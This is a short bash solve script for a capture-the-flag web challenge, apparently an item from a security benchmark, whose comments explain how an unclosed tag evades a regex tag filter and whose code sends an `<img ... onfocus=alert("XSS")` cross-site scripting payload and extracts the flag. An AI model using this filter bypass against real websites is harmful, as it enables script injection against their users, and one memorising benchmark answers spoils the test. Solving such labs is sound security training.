#!/usr/bin/env bash
# XBEN-015-24 — "Dalgona Challenges", star (tags: xss)
#
# Every tag but `<style>` is stripped, by a regex that matches `<` through the
# next `>`. A tag with no `>` of its own is therefore not a tag as far as the
# filter is concerned, and is very much one as far as the parser is concerned:
# it runs on to the `>` of the markup that follows, absorbing it as attributes.
#
# So the payload is left deliberately unclosed.
#
# The server renders the page, loads its own rendering in PhantomJS and prints
# the flag when a dialog fires with the message "XSS".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'query.name=<img src=x autofocus onfocus=alert("XSS")' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
